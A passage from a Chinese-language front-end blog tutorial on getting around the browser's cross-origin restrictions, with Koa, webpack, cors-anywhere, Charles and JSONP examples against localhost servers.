class="string">&quot;Access-Control-Request-Method&quot;</span>, <span class="string">&quot;PUT,POST,GET,DELETE,OPTIONS&quot;</span>);</span><br><span class="line">  ctx.<span class="title function_">set</span>(</span><br><span class="line">    <span class="string">&quot;Access-Control-Allow-Headers&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Origin, X-Requested-With, Content-Type, Accept, cc&quot;</span></span><br><span class="line">  );</span><br><span class="line">  <span class="keyword">if</span> (ctx.<span class="property">method</span> === <span class="string">&quot;OPTIONS&quot;</span>) &#123;</span><br><span class="line">    ctx.<span class="property">status</span> = <span class="number">204</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">next</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="97yOf"></a></p><h5 id="第三方中间件"><a href="#第三方中间件" class="headerlink" title="第三方中间件"></a>第三方中间件</h5><p>为了方便也可以直接使用中间件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> cors = <span class="built_in">require</span>(<span class="string">&quot;koa-cors&quot;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cors</span>());</span><br></pre></td></tr></table></figure><p><a name="U4oIw"></a></p><h5 id="关于-cors-的-cookie-问题"><a href="#关于-cors-的-cookie-问题" class="headerlink" title="关于 cors 的 cookie 问题"></a>关于 cors 的 cookie 问题</h5><p>想要传递 <code>cookie</code> 需要满足 3 个条件<br />1.web 请求设置<code>withCredentials</code><br />这里默认情况下在跨域请求，浏览器是不带 cookie 的。但是我们可以通过设置 <code>withCredentials</code> 来进行传递 <code>cookie</code>.</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 原生 xml 的设置方式</span></span><br><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">xhr.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// axios 设置方式</span></span><br><span class="line">axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p>2.<code>Access-Control-Allow-Credentials</code> 为 <code>true</code><br />3.<code>Access-Control-Allow-Origin</code>为非 <code>*</code><br />这里请求的方式，在 <code>chrome</code> 中是能看到返回值的，但是只要不满足以上其一，浏览器会报错，获取不到返回值。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176797624-53050b7f-68f9-4d79-b68f-70b5e2a29bfa.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176797624-53050b7f-68f9-4d79-b68f-70b5e2a29bfa.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;http://127.0.0.1:8080/api/corslist&#x27; from origin &#x27;http://127.0.0.1:8000&#x27; has been blocked by CORS policy: The value of the &#x27;Access-Control-Allow-Credentials&#x27; header in the response is &#x27;&#x27; which must be &#x27;true&#x27; when the request&#x27;s credentials mode is &#x27;include&#x27;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176807272-38d18a37-775a-4b63-bc69-d677a0add511.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176807272-38d18a37-775a-4b63-bc69-d677a0add511.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access to XMLHttpRequest at &#x27;http://127.0.0.1:8080/api/corslist&#x27; from origin &#x27;http://127.0.0.1:8000&#x27; has been blocked by CORS policy: The value of the &#x27;Access-Control-Allow-Origin&#x27; header in the response must not be the wildcard &#x27;*&#x27; when the request&#x27;s credentials mode is &#x27;include&#x27;. The credentials mode of requests initiated by the XMLHttpRequest is controlled by the withCredentials attribute.</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176815558-f9434297-a007-4a69-b00f-920142a35cda.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176815558-f9434297-a007-4a69-b00f-920142a35cda.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="ljQmC"></a></p><h4 id="前端示例"><a href="#前端示例" class="headerlink" title="前端示例"></a>前端示例</h4><p>分别演示一下前端部分 <code>简单请求</code> 和 <code>非简单请求</code></p><p><a name="KzKmL"></a></p><h5 id="简单请求-1"><a href="#简单请求-1" class="headerlink" title="简单请求"></a>简单请求</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.2/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  axios.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8080/api/corslist&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="jZPPo"></a></p><h5 id="非简单请求-1"><a href="#非简单请求-1" class="headerlink" title="非简单请求"></a>非简单请求</h5><p>这里我们加入了一个非集合内的 <code>header</code> 头 <code>cc</code> 来达到非简单请求的目的。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.2/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  axios.<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:8080/api/corslist&quot;</span>, &#123; <span class="attr">header</span>: &#123; <span class="attr">cc</span>: <span class="string">&quot;xxx&quot;</span> &#125; &#125;);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176826917-6898e954-0a04-47fe-b3d1-2cc1c5bff30b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176826917-6898e954-0a04-47fe-b3d1-2cc1c5bff30b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="C1AVM"></a></p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>1、 在新版的 chrome 中，如果你发送了复杂请求，你却看不到 <code>options</code> 请求。可以在这里设置 <code>chrome://flags/#out-of-blink-cors</code> 设置成 <code>disbale</code> ，重启浏览器。对于非简单请求就能看到 <code>options</code> 请求了。<br />2、 一般情况下后端接口是不会开启这个跨域头的，除非是一些与用户无关的不太重要的接口。</p><p><a name="SGGpx"></a></p><h3 id="Node-正向代理"><a href="#Node-正向代理" class="headerlink" title="Node 正向代理"></a>Node 正向代理</h3><p>代理的思路为，利用服务端请求不会跨域的特性，让接口和当前站点同域。<br /><strong>代理前</strong><br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176895466-02944916-21d4-4954-9611-3e7d1a11814d.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589176895466-02944916-21d4-4954-9611-3e7d1a11814d.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />这样，所有的资源以及请求都在一个域名下了。<br><a name="wOcP4"></a></p><h4 id="cli-工具中的代理"><a href="#cli-工具中的代理" class="headerlink" title="cli 工具中的代理"></a>cli 工具中的代理</h4><p><a name="LoJVV"></a></p><h5 id="1-Webpack-4-x"><a href="#1-Webpack-4-x" class="headerlink" title="1) Webpack (4.x)"></a>1) Webpack (4.x)</h5><p>在<code>webpack</code>中可以配置<code>proxy</code>来快速获得接口代理的能力。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">HtmlWebpackPlugin</span> = <span class="built_in">require</span>(<span class="string">&quot;html-webpack-plugin&quot;</span>);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">entry</span>: &#123;</span><br><span class="line">    <span class="attr">index</span>: <span class="string">&quot;./index.js&quot;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">output</span>: &#123;</span><br><span class="line">    <span class="attr">filename</span>: <span class="string">&quot;bundle.js&quot;</span>,</span><br><span class="line">    <span class="attr">path</span>: path.<span class="title function_">resolve</span>(__dirname, <span class="string">&quot;dist&quot;</span>)</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">devServer</span>: &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8000</span>,</span><br><span class="line">    <span class="attr">proxy</span>: &#123;</span><br><span class="line">      <span class="string">&quot;/api&quot;</span>: &#123;</span><br><span class="line">        <span class="attr">target</span>: <span class="string">&quot;http://localhost:8080&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">plugins</span>: [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">HtmlWebpackPlugin</span>(&#123;</span><br><span class="line">      <span class="attr">filename</span>: <span class="string">&quot;index.html&quot;</span>,</span><br><span class="line">      <span class="attr">template</span>: <span class="string">&quot;webpack.html&quot;</span></span><br><span class="line">    &#125;)</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>前端接口请求省略。<br />脚手架中都会有关于代理的详细配置，这里省略。这些配置都是有着共同的底层包 <code>http-proxy-middleware</code> ，里面需要用到的各种 <code>websocket</code> ，<code>rewrite</code> 等功能，直接看这个库的配置就可以了。<br><a name="E68in"></a></p><h4 id="使用自己的代理工具"><a href="#使用自己的代理工具" class="headerlink" title="使用自己的代理工具"></a>使用自己的代理工具</h4><p><strong>cors-anywhere</strong><br /><strong>服务端：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Listen on a specific host via the HOST environment variable</span></span><br><span class="line"><span class="keyword">var</span> host = process.<span class="property">env</span>.<span class="property">HOST</span> || <span class="string">&quot;0.0.0.0&quot;</span>;</span><br><span class="line"><span class="comment">// Listen on a specific port via the PORT environment variable</span></span><br><span class="line"><span class="keyword">var</span> port = process.<span class="property">env</span>.<span class="property">PORT</span> || <span class="number">7777</span>;</span><br><span class="line"><span class="keyword">var</span> cors_proxy = <span class="built_in">require</span>(<span class="string">&quot;cors-anywhere&quot;</span>);</span><br><span class="line">cors_proxy</span><br><span class="line">  .<span class="title function_">createServer</span>(&#123;</span><br><span class="line">    <span class="attr">originWhitelist</span>: [], <span class="comment">// Allow all origins</span></span><br><span class="line">    <span class="attr">requireHeader</span>: [<span class="string">&quot;origin&quot;</span>, <span class="string">&quot;x-requested-with&quot;</span>],</span><br><span class="line">    <span class="attr">removeHeaders</span>: [<span class="string">&quot;cookie&quot;</span>, <span class="string">&quot;cookie2&quot;</span>]</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">listen</span>(port, host, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Running CORS Anywhere on &quot;</span> + host + <span class="string">&quot;:&quot;</span> + port);</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><p><strong>前端代码：</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.2/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  getlist.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    axios</span></span><br><span class="line"><span class="language-javascript">      .<span class="title function_">get</span>(<span class="string">&quot;http://127.0.0.1:7777/http://127.0.0.1:8080/api/corslist&quot;</span>)</span></span><br><span class="line"><span class="language-javascript">      .<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">      &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  login.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    axios.<span class="title function_">post</span>(<span class="string">&quot;http://127.0.0.1:7777/http://127.0.0.1:8080/api/login&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>效果展示：</strong><br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589184916263-4d343acc-4804-45b0-9e9d-296d430341f6.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589184916263-4d343acc-4804-45b0-9e9d-296d430341f6.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br><a name="c-charles"></a></p><h4 id="charles"><a href="#charles" class="headerlink" title="charles"></a>charles</h4><p><a name="lWcvV"></a></p><h5 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h5><p>这是一个测试、开发的神器。<a href="https://juejin.im/post/5b8350b96fb9a019d9246c4c">介绍与使用</a><br />利用 charles 进行跨域，本质就是请求的拦截与代理。<br />在 <code>tools/map remote</code> 中设置代理<br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589185019849-762cb0a5-1010-4925-8a33-216d57bc0ac1.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589185019849-762cb0a5-1010-4925-8a33-216d57bc0ac1.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="kzdel"></a></p><h5 id="-1"><a href="#-1" class="headerlink" title=""></a></h5><p><a name="rdguw"></a></p><h5 id="前端代码"><a href="#前端代码" class="headerlink" title="前端代码"></a>前端代码</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;getlist&quot;</span>&gt;</span>获取列表<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;login&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.bootcss.com/axios/0.19.2/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  axios.<span class="property">defaults</span>.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span></span><br><span class="line"><span class="language-javascript">  getlist.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    axios.<span class="title function_">get</span>(<span class="string">&quot;/api/corslist&quot;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(res.<span class="property">data</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript">  login.<span class="property">onclick</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    axios.<span class="title function_">post</span>(<span class="string">&quot;/api/login&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><a name="pdvPw"></a></p><h5 id="后端代码"><a href="#后端代码" class="headerlink" title="后端代码"></a>后端代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.get(&quot;/api/corslist&quot;, async ctx =&gt; &#123;</span><br><span class="line">  ctx.body = &#123;</span><br><span class="line">    data: [&#123; name: &quot;秋风的笔记&quot; &#125;]</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br><span class="line">router.post(&quot;/api/login&quot;, async ctx =&gt; &#123;</span><br><span class="line">  ctx.cookies.set(&quot;token&quot;, token, &#123;</span><br><span class="line">    expires: new Date(+new Date() + 1000 * 60 * 60 * 24 * 7)</span><br><span class="line">  &#125;);</span><br><span class="line">  ctx.body = &#123;</span><br><span class="line">    msg: &quot;成功&quot;,</span><br><span class="line">    code: 0</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a name="sNw7N"></a></p><h5 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h5><p>访问 <a href="http://localhost:8000/charles">http://localhost:8000/charles</a><br /><img src="https://cdn.nlark.com/yuque/0/2020/png/164572/1589185019811-c9644b6e-6fab-4115-bc8a-f46fca8dddc0.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/164572/1589185019811-c9644b6e-6fab-4115-bc8a-f46fca8dddc0.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"></p><p><a name="KYmI3"></a></p><h3 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h3><p><code>JSONP</code> 主要就是利用了 <code>script</code> 标签没有跨域限制的这个特性来完成的。<br><a name="mLEgV"></a></p><h4 id="使用限制"><a href="#使用限制" class="headerlink" title="使用限制"></a>使用限制</h4><p>仅支持 GET 方法，如果想使用完整的 REST 接口，请使用 CORS 或者其他代理方式。<br><a name="redp6"></a></p><h4 id="流程解析"><a href="#流程解析" class="headerlink" title="流程解析"></a>流程解析</h4><p>1.前端定义解析函数（例如 jsonpCallback&#x3D;function(){….}）<br />2.通过 params 形式包装请求参数，并且声明执行函数(例如 cb&#x3D;jsonpCallback)<br />3.后端获取前端声明的执行函数（jsonpCallback），并以带上参数并调用执行函数的方式传递给前端。<br><a name="oM4cK"></a></p><h4 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h4><p>后端实现</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Koa</span> = <span class="built_in">require</span>(<span class="string">&quot;koa&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="keyword">new</span> <span class="title class_">Koa</span>();</span><br><span class="line">app.<span class="title function_">use</span>(<span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (ctx.<span class="property">path</span> === <span class="string">&quot;/api/jsonp&quot;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; cb, msg &#125; = ctx.<span class="property">query</span>;</span><br><span class="line">    ctx.<span class="property">body</span> = <span class="string">`<span class="subst">$&#123;cb&#125;</span>(<span class="subst">$&#123;<span class="built_in">JSON</span>.stringify(&#123; msg &#125;)&#125;</span>)`</span>;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>);</span><br></pre></td></tr></table></figure><p>普通 js 示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">jsonpCallback</span> = <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/api/jsonp?msg=hello&amp;cb=jsonpCallback&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">  <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>JQuery Ajax 示例</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;https://cdn.bootcss.com/jquery/3.5.0/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  $.<span class="title function_">ajax</span>(&#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">url</span>: <span class="string">&quot;http://localhost:8080/api/jsonp&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">dataType</span>: <span class="string">&quot;jsonp&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">type</span>: <span class="string">&quot;get&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">data</span>: &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="attr">msg</span>: <span class="string">&quot;hello&quot;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">jsonp</span>: <span class="string">&quot;cb&quot;</span>,</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="variable language_">console</span>.<span class="title function_">log</span>(data);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">    &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">  &#125;);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p><a name="aRz5M"></a></p><h4 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h4><p>其实这就是 js 的魔法<br />我们先来看最简单的 js 调用。嗯，很自然的调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">jsonpCallback</span> = <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">  jsonpCallback(&#123; a: 1 &#125;);</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>我们稍稍改造一下，外链的形式。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">jsonpCallback</span> = <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://localhost:8080/api/a.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="comment">// http://localhost:8080/api/a.js jsonpCallback(&#123;a:1&#125;);</span></span><br></pre></td></tr></table></figure><p>我们再改造一下，我们把这个外链的 js 就当做是一个动态的接口，因为本身资源和接口一样，是一个请求，也包含各种参数，也可以动态化返回。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="variable language_">window</span>.<span class="property">jsonpCallback</span> = <span class="keyword">function</span>(<span class="params">res</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(res);</span><br><span class="line">  &#125;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span 